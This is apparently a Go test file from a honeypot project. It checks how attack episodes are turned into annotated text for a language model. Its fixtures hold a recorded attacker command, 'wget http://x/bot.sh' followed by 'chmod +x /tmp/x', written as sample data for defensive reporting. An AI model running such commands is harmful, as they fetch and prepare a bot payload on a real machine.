package report

import (
	"strings"
	"testing"
	"time"

	"github.com/k0braintheworld/k0pot/internal/episodio"
	"github.com/k0braintheworld/k0pot/internal/store"
)

func ataque(sev episodio.Severidad, ip string, ajustar func(*store.EpisodioFila)) store.EpisodioFila {
	e := store.EpisodioFila{
		Episodio: episodio.Episodio{
			Clave: ip, IP: ip, Protocolo: "ssh", Severidad: sev,
			Inicio: time.Now().Add(-time.Hour), Fin: time.Now(),
			Eventos: 3, Resumen: "Resumen del ataque",
		},
	}
	if ajustar != nil {
		ajustar(&e)
	}
	return e
}

func TestSinAtaquesNoHaySeccion(t *testing.T) {
	if AtaquesComoTexto(nil) != "" {
		t.Error("sin ataques no deberia escribirse nada")
	}
}

// Lo que el modelo necesita para narrar en vez de parafrasear cifras.
func TestElTextoLlevaLoQueHaceFaltaParaNarrar(t *testing.T) {
	e := ataque(episodio.Intrusion, "1.2.3.4", func(e *store.EpisodioFila) {
		e.Pais, e.ISP, e.Reputacion = "NL", "Amarutu Technology Ltd", 100
		e.LoginExitoso = true
		e.LoginsFallidos = 12
		e.Comandos = []string{"wget http://x/bot.sh", "chmod +x /tmp/x"}
	})
	texto := AtaquesComoTexto([]store.EpisodioFila{e})

	for _, quiero := range []string{
		"INTRUSION", "1.2.3.4", "NL", "Amarutu", "CONSIGUIO ENTRAR", "12 intentos",
	} {
		if !strings.Contains(texto, quiero) {
			t.Errorf("falta %q en:\n%s", quiero, texto)
		}
	}
}

// Sin las notas, el modelo explica de memoria que significa una ruta, y lo
// hace con el mismo aplomo tanto si acierta como si no.
func TestLasObservacionesVanAnotadas(t *testing.T) {
	e := ataque(episodio.Tanteo, "1.2.3.4", func(e *store.EpisodioFila) {
		e.Protocolo = "http"
		e.Rutas = []string{"/SDK/webLanguage", "/una/ruta/desconocida"}
		e.Comandos = []string{"wget http://x/bot.sh"}
	})
	texto := AtaquesComoTexto([]store.EpisodioFila{e})

	if !strings.Contains(texto, "[SDK de camaras IP Hikvision") {
		t.Errorf("la ruta conocida deberia ir anotada:\n%s", texto)
	}
	if !strings.Contains(texto, "[descarga de un programa") {
		t.Errorf("el comando conocido deberia ir anotado:\n%s", texto)
	}
	// Lo desconocido aparece, pero desnudo: es la senal de que ahi no hay
	// nada que el modelo pueda dar por cierto.
	for _, linea := range strings.Split(texto, "\n") {
		if strings.Contains(linea, "/una/ruta/desconocida") && strings.Contains(linea, "[") {
			t.Errorf("no deberia inventarse una nota: %q", linea)
		}
	}
}

func TestElProveedorSeAnota(t *testing.T) {
	e := ataque(episodio.Roce, "1.2.3.4", func(e *store.EpisodioFila) {
		e.ISP = "Censys, Inc."
	})
	if !strings.Contains(AtaquesComoTexto([]store.EpisodioFila{e}), "no van a por ti") {
		t.Error("un escaner de investigacion deberia venir identificado")
	}
}

// Contarle 500 ataques al modelo engorda la factura sin cambiar nada: los
// primeros, que son los graves, ya dicen lo que hay.
func TestSeAcotaLoQueSeLeCuentaAlModelo(t *testing.T) {
	var muchos []store.EpisodioFila
	for i := 0; i < 60; i++ {
		muchos = append(muchos, ataque(episodio.Roce, "9.9.9.9", nil))
	}
	texto := AtaquesComoTexto(muchos)
	if strings.Count(texto, "contra ssh") > topeAtaques {
		t.Errorf("se colaron %d ataques, el tope es %d",
			strings.Count(texto, "contra ssh"), topeAtaques)
	}
	if !strings.Contains(texto, "ataques mas") {
		t.Error("hay que decir cuantos se omitieron; callarlo aparenta cobertura total")
	}
}

// La huella tiene que moverse con los ataques: si no, un ataque nuevo que
// no altere los recuentos no generaria informe nuevo, que es justo cuando
// hace falta.
func TestLaHuellaCambiaConLosAtaques(t *testing.T) {
	base := Datos{Resumen: &store.Resumen{Total: 5}}
	con := base
	con.Episodios = []store.EpisodioFila{ataque(episodio.Intrusion, "1.2.3.4", nil)}
	if Huella(base) == Huella(con) {
		t.Error("un ataque nuevo deberia cambiar la huella")
	}
}
